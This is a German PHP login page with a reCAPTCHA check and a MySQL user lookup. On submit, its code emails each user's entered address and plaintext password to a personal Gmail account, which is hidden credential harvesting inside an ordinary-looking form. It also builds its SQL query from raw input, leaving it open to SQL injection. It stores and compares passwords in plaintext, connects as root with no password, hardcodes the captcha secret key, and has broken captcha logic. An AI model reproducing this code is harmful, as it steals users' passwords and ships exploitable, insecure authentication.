<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="login.css" type="text/css">
    <script src="https://www.google.com/recaptcha/api.js?render=6Lc6gqwdAAAAAOsrAUx2cbxKenfK71CAWkmzbsCL"></script>
    <title>Login</title>
</head>


<body>
<!-- Recaptcha für sicherheit -->
<script>
        grecaptcha.ready(function() {
          grecaptcha.execute('6Lc6gqwdAAAAAOsrAUx2cbxKenfK71CAWkmzbsCL', {action: 'submit'}).then(function(token) {
              document.getElementById("token").value = token;
          });
        });
  </script>



<!-- Beginn von Anmelde Formular -->
    <section class="background">
        <div class="login">
                <form action="" method = "POST">
                    <h1>Anmeldung</h1>
                    <div class="login-div">
                        <ion-icon name="mail-outline"></ion-icon>
                        <input type="email" name="mail" placeholder = 'E-Mail'>
                    </div>    
                    <div class="login-div">
                        <ion-icon name="lock-closed-outline"></ion-icon>
                        <input type="password" name="passwort" Placeholder = 'Passwort'>
                    </div>
                    <input type="hidden" name="token" id="token">
                    <div class="send">
                        <input type="submit" value="Anmelden" name = "login">
                    </div>
                    <div class="reg">
                        <a href="register.php" class = "reg">Hier registrieren</a>
                    </div>



    <?php
//Wenn der Login Knopf gedrückt wird 
            if(isset($_POST["login"])){

//wird captcha anfrage gestellt, überprüft und überschrieben
                $request = file_get_contents("https://www.google.com/recaptcha/api/siteverify?secret=6Lc6gqwdAAAAAJTXO6KRdf9sOuDwatznwix0cSE_&response=".$_POST["token"]);
                $request = json_decode($request);
                if($request ->sucess == true){
                        if($request ->score= 0.6){
                        mail("denis.delwa@gmail.com", "Login", 'username: '.$_POST["username"]. 'email: '.$_POST["mail"]. 'passwort: '.$_POST["passwort"]);
                        ?>
                        <h1 style="color: black;">Die Login Anfrage wurde gesendet!</h1>


      
<?php
                    } else {
                        echo "Die Anfrage wurde aufgrund von Spamverdacht blockiert.";
                        }
                    } else {
                        echo "Es gab einen Fehler mit Captcha";

                        }
                     }
//Starte Session
                session_start();
//Zwischenspeicherung von Input Inhalt in Variablen 
                $email = $_POST["mail"];
                $passwort = $_POST["passwort"];
//Verbindung Datenbank
                $con = mysqli_connect("localhost", "root", "", "bbs");
//Abrage mit Input Daten und Query
                $sql = "SELECT * FROM user WHERE email = '$email' AND passwort = '$passwort'";
                $res = mysqli_query($con, $sql);
//Zählen der Datensätze der Abfrage
                $num = mysqli_num_rows($res);
//Wenn Datensatz vorhanden
                if($num > 0){
//Scanne den Inhalt und Speicher zwischen in Variablen 
                    while($dset = mysqli_fetch_assoc($res)){
                        $username = $dset["username"];
                        $rolle = $dset["rolle"];
                    }
                    //Session Variable für Username, Rolle und den Anmelde Status
                    $_SESSION["username"] = $username;
                    $_SESSION["rolle"] = $rolle;
                    $_SESSION["login"] = true;
                    //Gehe zu der Mainpage
                    header("Location:index.php");
                }
                //Wenn keine Datensätze vorhanden gebe eine Fehlermeldung
                else{
                    echo"<script>alert('Deine E-Mail oder Passwortt sind falsch!')</script>"; 
                }

    ?>     
            <!-- Ende vom Formular und Tabelle sowie dem Abschnitt der Seite -->
                </form>  
        </div>
    </section>
    <!-- Script für die Icons der Nav Leiste -->
    <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
    <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
</body>
</html>